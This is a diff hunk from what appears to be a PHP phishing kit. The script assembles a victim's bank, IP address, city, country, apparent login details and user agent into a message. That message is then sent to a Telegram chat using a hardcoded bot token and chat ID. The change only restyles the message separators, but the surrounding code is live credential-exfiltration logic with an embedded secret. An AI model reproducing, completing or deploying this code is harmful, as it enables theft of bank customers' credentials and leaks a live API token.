@@ -195,7 +195,7 @@ if ($success==false) {
     fclose($fp);
 }
 
-$message =" $bank$lh$ip\n\n-----------------\n\n$bsr$lh$uos\n\n-----------------\n\n$is\n\n-----------------\n\n$city$lh$country\n\n-----------------\n\n$la$li$lp\n\n-----------------\n\n$uaget";
+$message =" $bank$lh$ip\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$bsr$lh$uos\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$is\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$city$lh$country\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$la$li$lp\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$uaget";
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
     'chat_id' => '-821080105',
